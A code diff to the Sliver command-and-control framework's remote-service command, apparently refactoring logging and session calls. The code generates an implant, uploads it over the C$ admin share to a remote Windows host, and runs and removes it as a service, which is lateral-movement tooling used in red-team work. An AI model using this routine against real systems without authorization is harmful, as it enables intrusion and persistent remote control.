@@ -1,4 +1,4 @@
-package windows
+package persistence
 
 /*
 	Sliver Implant Framework
@@ -27,7 +27,7 @@ import (
 	"time"
 
 	"github.com/bishopfox/sliver/client/core"
-	"github.com/bishopfox/sliver/client/spin"
+	"github.com/bishopfox/sliver/client/log"
 	"github.com/bishopfox/sliver/client/transport"
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
@@ -62,8 +62,8 @@ func (s *Service) Execute(args []string) (err error) {
 	uploadPath := fmt.Sprintf(`\\%s\%s`, hostname, strings.ReplaceAll(strings.ToLower(binPath), "c:", "C$"))
 
 	if serviceName == "Sliver" || serviceDesc == "Sliver implant" {
-		fmt.Printf(Error+"Warning: you're going to deploy the following service:\n- Name: %s\n- Description: %s\n", serviceName, serviceDesc)
-		fmt.Println(Error + "You might want to change that before going further...")
+		log.Errorf("Warning: you're going to deploy the following service:\n- Name: %s\n- Description: %s\n", serviceName, serviceDesc)
+		log.Errorf("You might want to change that before going further...\n")
 		if !core.IsUserAnAdult() {
 			return
 		}
@@ -71,10 +71,10 @@ func (s *Service) Execute(args []string) (err error) {
 
 	// generate sliver
 	generateCtrl := make(chan bool)
-	go spin.Until(fmt.Sprintf("Generating sliver binary for %s\n", profile), generateCtrl)
+	go log.SpinUntil(fmt.Sprintf("Generating sliver binary for %s\n", profile), generateCtrl)
 	profiles, err := transport.RPC.ImplantProfiles(context.Background(), &commonpb.Empty{})
 	if err != nil {
-		fmt.Printf(Error+"Error: %v\n", err)
+		log.Errorf("Error: %v\n", err)
 		return
 	}
 	generateCtrl <- true
@@ -86,7 +86,7 @@ func (s *Service) Execute(args []string) (err error) {
 		}
 	}
 	if p.GetName() == "" {
-		fmt.Printf(Error+"no profile found for name %s\n", profile)
+		log.Errorf("no profile found for name %s\n", profile)
 		return
 	}
 	sliverBinary, err := getSliverBinary(*p, transport.RPC)
@@ -95,21 +95,21 @@ func (s *Service) Execute(args []string) (err error) {
 	uploadGzip := new(encoders.Gzip).Encode(sliverBinary)
 	// upload to remote target
 	uploadCtrl := make(chan bool)
-	go spin.Until("Uploading service binary ...", uploadCtrl)
+	go log.SpinUntil("Uploading service binary ...", uploadCtrl)
 	upload, err := transport.RPC.Upload(context.Background(), &sliverpb.UploadReq{
 		Encoder: "gzip",
 		Data:    uploadGzip,
 		Path:    filePath,
-		Request: core.ActiveSessionRequest(),
+		Request: core.ActiveTarget.Request(),
 	})
 	uploadCtrl <- true
 	<-uploadCtrl
 	if err != nil {
-		fmt.Printf(Error+"Error: %s\n", err)
+		log.Errorf("Error: %s\n", err)
 		return
 	}
-	fmt.Printf(Info+"Uploaded service binary to %s\n", upload.GetPath())
-	fmt.Println(Info + "Waiting a bit for the file to be analyzed ...")
+	log.Infof("Uploaded service binary to %s\n", upload.GetPath())
+	log.Infof("Waiting a bit for the file to be analyzed ...\n")
 	// Looks like starting the service right away often fails
 	// because a process is already using the binary.
 	// I suspect that Defender on my lab is holding access
@@ -119,46 +119,46 @@ func (s *Service) Execute(args []string) (err error) {
 	// start service
 	binaryPath := fmt.Sprintf(`%s\%s.exe`, binPath, filename)
 	serviceCtrl := make(chan bool)
-	go spin.Until("Starting service ...", serviceCtrl)
+	go log.SpinUntil("Starting service ...", serviceCtrl)
 	start, err := transport.RPC.StartService(context.Background(), &sliverpb.StartServiceReq{
 		BinPath:            binaryPath,
 		Hostname:           hostname,
 		ServiceDescription: serviceDesc,
 		ServiceName:        serviceName,
 		Arguments:          "",
-		Request:            core.ActiveSessionRequest(),
+		Request:            core.ActiveTarget.Request(),
 	})
 	serviceCtrl <- true
 	<-serviceCtrl
 	if err != nil {
-		fmt.Printf(Error+"Error: %v\n", err)
+		log.Errorf("Error: %v\n", err)
 		return
 	}
 	if start.Response != nil && start.Response.Err != "" {
-		fmt.Printf(Error+"Error: %s\n", start.Response.Err)
+		log.Errorf("Error: %s\n", start.Response.Err)
 		return
 	}
-	fmt.Printf(Info+"Successfully started service on %s (%s)\n", hostname, binaryPath)
+	log.Infof("Successfully started service on %s (%s)\n", hostname, binaryPath)
 	removeChan := make(chan bool)
-	go spin.Until("Removing service ...", removeChan)
+	go log.SpinUntil("Removing service ...", removeChan)
 	removed, err := transport.RPC.RemoveService(context.Background(), &sliverpb.RemoveServiceReq{
 		ServiceInfo: &sliverpb.ServiceInfoReq{
 			Hostname:    hostname,
 			ServiceName: serviceName,
 		},
-		Request: core.ActiveSessionRequest(),
+		Request: core.ActiveTarget.Request(),
 	})
 	removeChan <- true
 	<-removeChan
 	if err != nil {
-		fmt.Printf(Error+"Error: %v\n", err)
+		log.Errorf("Error: %v\n", err)
 		return
 	}
 	if removed.Response != nil && removed.Response.Err != "" {
-		fmt.Printf(Error+"Error: %s\n", removed.Response.Err)
+		log.Errorf("Error: %s\n", removed.Response.Err)
 		return
 	}
-	fmt.Printf(Info+"Successfully removed service %s on %s\n", serviceName, hostname)
+	log.Infof("Successfully removed service %s on %s\n", serviceName, hostname)
 	return nil
 }
 
@@ -183,9 +183,9 @@ func getSliverBinary(profile clientpb.ImplantProfile, rpc rpcpb.SliverRPCClient)
 	_, ok := builds.GetConfigs()[implantName]
 	if implantName == "" || !ok {
 		// no built implant found for profile, generate a new one
-		fmt.Printf(Info+"No builds found for profile %s, generating a new one\n", profile.GetName())
+		log.Infof("No builds found for profile %s, generating a new one\n", profile.GetName())
 		ctrl := make(chan bool)
-		go spin.Until("Compiling, please wait ...", ctrl)
+		go log.SpinUntil("Compiling, please wait ...", ctrl)
 		generated, err := rpc.Generate(context.Background(), &clientpb.GenerateReq{
 			Config: profile.GetConfig(),
 		})
@@ -204,7 +204,7 @@ func getSliverBinary(profile clientpb.ImplantProfile, rpc rpcpb.SliverRPCClient)
 		}
 	} else {
 		// Found a build, reuse that one
-		fmt.Printf(Info+"Sliver name for profile: %s\n", implantName)
+		log.Infof("Sliver name for profile: %s\n", implantName)
 		regenerate, err := rpc.Regenerate(context.Background(), &clientpb.RegenerateReq{
 			ImplantName: profile.GetConfig().GetName(),
 		})
